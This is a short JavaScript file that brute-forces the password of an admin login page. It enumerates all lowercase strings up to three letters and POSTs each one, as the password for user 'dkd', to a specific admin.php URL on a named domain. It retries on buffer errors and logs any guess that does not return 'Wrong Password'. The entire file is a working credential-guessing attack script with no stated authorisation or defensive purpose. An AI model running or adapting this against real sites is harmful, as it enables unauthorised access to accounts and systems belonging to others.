function generateCombinations(length) {
    const alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
    // const alphabet = ['d','k'];
    
    const combinations = [];
  
    function generate(prefix, remainingLength) {
      if (remainingLength === 0) {
        combinations.push(prefix);
        // fetchData(prefix)
        
        return;
      }
  
      for (let i = 0; i < alphabet.length; i++) {
        const nextPrefix = prefix + alphabet[i];
        generate(nextPrefix, remainingLength - 1);
      }
    }
  
    for (let i = 1; i <= length; i++) {
      generate('', i);
    }
  
    return combinations;
  }
  
  // Usage
  const result = generateCombinations(3);

//  result.forEach(req => {
    
//  })
fetchData(result)

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  async function fetchData(result) {
    for (const item of result) {
      let headersList = {
        "Accept": "*/*",
        "User-Agent": "Thunder Client (https://www.thunderclient.com)"
      };
      
      let bodyContent = new FormData();
      bodyContent.append("name", "dkd");
      bodyContent.append("password", `${item}`);
      bodyContent.append("login", "");
      
      while (true) {
        try {
          let response = await fetch("https://designshoretest.com/01dk/passwordsetup/admin.php", { 
            method: "POST",
            body: bodyContent,
            headers: headersList
          });
          
          let data = await response.text();
          if (!data.includes('Wrong Password')) {
            console.log(item);
            break;
          }
          
          // Request succeeded, break out of the loop
          break;
        } catch (error) {
          if (error.code === 'ENOBUFS') {
            // Request buffer is full, wait for a while and retry
            await delay(2000); // Wait for 1 second (adjust the delay as needed)
          } else {
            // Handle other errors
            // console.error(error);
            return;
          }
        }
      }
    }
  }
  


  
  
 async function test(name){
    let headersList = {
        "Accept": "*/*",
        "User-Agent": "Thunder Client (https://www.thunderclient.com)"
       }
       
       let bodyContent = new FormData();
       bodyContent.append("name", "dkd");
       bodyContent.append("password", `${name}`);
       bodyContent.append("login", "");
       
       let response = await fetch("https://designshoretest.com/01dk/passwordsetup/admin.php", { 
         method: "POST",
         body: bodyContent,
         headers: headersList
       });
       
       let data = await response.text();
       if(data.includes('Welcome To Admin'))
       console.log(data)
    //    console.log((data.includes('Welcome To Admin')) ? name : "false");
 }

 